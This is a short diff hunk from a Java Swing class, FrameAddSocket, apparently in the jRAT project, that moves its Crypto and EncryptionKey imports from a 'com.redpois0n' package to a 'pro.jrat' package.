@@ -20,12 +20,12 @@ import javax.swing.SpinnerNumberModel;
 import javax.swing.border.EmptyBorder;
 
 import pro.jrat.ErrorDialog;
+import pro.jrat.common.crypto.Crypto;
+import pro.jrat.common.crypto.EncryptionKey;
 import pro.jrat.net.PortListener;
 import pro.jrat.ui.components.EncryptionKeyJTextField;
 import pro.jrat.utils.Util;
 
-import com.redpois0n.common.crypto.Crypto;
-import com.redpois0n.common.crypto.EncryptionKey;
 
 @SuppressWarnings("serial")
 public class FrameAddSocket extends BaseFrame {
